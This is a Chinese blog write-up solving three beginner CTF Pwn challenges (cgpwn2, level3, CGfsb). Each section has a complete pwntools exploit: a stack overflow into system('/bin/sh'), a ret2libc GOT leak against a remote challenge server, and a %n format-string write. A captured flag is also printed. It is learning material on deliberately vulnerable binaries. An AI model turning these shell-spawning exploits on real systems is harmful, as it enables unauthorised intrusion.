---
title: 「攻防世界」Pwn - cgpwn2|level3|CGfsb WriteUps
date: 2021-12-30
tags: ["CTF", "Pwn", "writeup", "wp"]
authors: [nova]
---

## cgpwn2 | level3 | CGfsb

### **碎碎念**

因为这半个月事情很多（摆邮 major/APEX/期中考），加上新环境一直有问题，所以基本上没有什么关于 CTF 的内容:I 但是其他的事情也基本没什么进展

马上又要打比赛了，想着临时抱佛 jio 冲一哈，先把这几个简单的栈相关的题目搞一下:&lt;

原本想要每题都做一个详尽的 WP 水文章来着，但是好像比较基础就合在一起了:>

<!--truncate-->

### **cgpwn2**

直接拖进 checksec/ida

![https://oss.nova.gal/img/image-20211112104246870.png](https://oss.nova.gal/img/image-20211112104246870.png)

![https://oss.nova.gal/img/image-20211112105108027.png](https://oss.nova.gal/img/image-20211112105108027.png)

![https://oss.nova.gal/img/image-20211112112126099.png](https://oss.nova.gal/img/image-20211112112126099.png)

这题意图就很明显了：在第一个 gets 中输入指令（"/bin/sh"），第二个 gets 中溢出然后调用 system 函数

> system + 返回地址 + 指令

于是找出偏移和地址，轻松写出 exp>

```
from pwn import *

context(log_level='debug')

r = process('./53c24fc5522e4a8ea2d9ad0577196b2f')

r.recvuntil('your name\\n')
r.sendline(b'/bin/sh')

cmd_addr = 0x0804A080
system_addr = 0x08048420
payload = b'A'*0x2A + p32(system_addr) + p32(0) + p32(cmd_addr)

r.recvuntil('here:\\n')
r.sendline(payload)
r.interactive()
```

拿到 flag`cyberpeace{53e372c0f3209a11ef4429e8e2546bbf}`

### **level3**

看题目介绍应该是 ret2libc 的题，这是我第一题 libc 泄露，所以着重讲讲

> 知识点：CTF-WIKI

下载下来是一个 gz 压缩文件，解压出来是一个 so 文件和 elf 文件

（结果我 tar 解压的时候不知道为什么名字不能自动补全，手搓了 32 位 md5 码的文件名了属于是）

按照惯例 checksec 看一下(checksec 也不知道为什么软连接搞不上，我要吐力)

![https://oss.nova.gal/img/image-20211112114145579.png](https://oss.nova.gal/img/image-20211112114145579.png)

![https://oss.nova.gal/img/image-20211112140131570.png](https://oss.nova.gal/img/image-20211112140131570.png)

总之先上 EXP:

```
from pwn import *

context(log_level="DEBUG")
# r = process("./level3")
r = remote("111.200.241.244", 53829)
elf = ELF("./level3")
libc = ELF("./libc_32.so.6")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
func = elf.sym["vulnerable_function"]

payload1 = b'a'*0x88 + b'aaaa' + p32(write_plt) + p32(func) + p32(1) + p32(write_got) + p32(4)
r.recvuntil("Input:\\n")
r.sendline(payload1)

write_addr = u32(r.recv(4))

write_libc = libc.sym["write"]
system_libc = libc.sym["system"]
bin_sh_libc = next(libc.search(b"/bin/sh"))
print('write_addr: ', hex(write_addr))

libc_base = write_addr - write_libc
system_addr = libc_base + system_libc
bin_sh_addr = libc_base + bin_sh_libc

print('bin_sh_addr: ', hex(bin_sh_addr))
print('system_addr: ', hex(system_addr))

payload2 = b'a'*0x88 + b'aaaa' + p32(system_addr) + p32(0) + p32(bin_sh_addr)
r.recvuntil("Input:\\n")
r.send(payload2)
r.interactive()
```

这里有个很奇怪的点，我写 exp 的时候用的是 Python3.10.0，但是本地调试的时候这个 exploit 是过不了的，换成 py2 又可以过

关键是我只更改了`bin_sh_libc`这里的代码，py2 用的是`generator.next()`，而 py3 用的是`next(generator)`，但是结果是一样的。

我把最后的 payload 打印出来对比也没有任何区别（肉眼上）。但是 Py3 远程又是能过的^ ^，不知道什么高手情况。

#### **分析**

整个程序非常简单，也只有一个`vulnerable_function`可以利用，但是程序中并没有利用到 system 函数，这里就自然的引出了 GOT 表泄露。

得益于 libc 的延迟绑定机制，我们如果知道 libc 中某个函数的地址，就可以通过其在程序中的地址与 libc 中地址的差算出偏移。又由于 libc.so 动态链接库中的函数之间相对偏移是固定的，得到了偏移，再通过 libc 中我们想要的函数的地址，就可以确定其函数在程序当中的地址。

```
payload1 = b'a'*0x88 + b'aaaa' + p32(write_plt) + p32(func) + p32(1) + p32(write_got) + p32(4)
```

首先看 payload1，先填充 buf 不多说，覆盖返回地址这里值得注意：

我们先将返回地址覆盖为 write_plt，再将 func 作为 write 函数的返回地址，后面再填 write 的三个参数，这样做的话在 write 结束后就又会跳转会`vulnerable_function()`这里，便可以截到 write 的 GOT 地址

接下来就是算偏移和找地址，不多赘述。

此时程序又一次运行到了`read()`函数这里，那直接轻松覆盖一个 system 函数上去就好了:>

### **CGfsb**

![https://oss.nova.gal/img/image-20211112141233440.png](https://oss.nova.gal/img/image-20211112141233440.png)

一眼 FormatString

需要使得`0x0804A068`这个地址的变量`pwnme`为 8

先找到格式化字符串的参数在第几个

```
from pwn import *

context(log_level="DEBUG")
r = process("./e41a0f684d0e497f87bb309f91737e4d")

r.sendlineafter("your name:\\n", p32(0x0804A068))
r.recvuntil('please:\\n')
r.sendline(b'AAAA' + b'%x.'*0x10)
r.recvuntil("is:\\n")
print(r.recv())
```

![https://oss.nova.gal/img/image-20211112142129570.png](https://oss.nova.gal/img/image-20211112142129570.png)

可以看到 41414141 在第十个参数的位置，那么我们只需要把 pwnme 的地址写入，然后通过%n 把 8 写入它就好了

最后的 exp:

```
from pwn import *

context(log_level="DEBUG")
r = process("./e41a0f684d0e497f87bb309f91737e4d")

r.sendlineafter("your name:\\n", p32(0x0804A068))
r.recvuntil('please:\\n')
r.sendline(p32(0x0804A068) + b'AAAA' + b'%10$n')
r.interactive()
```

至此，宣告 PWN 的新手区 AK（不容易啊 🥵）
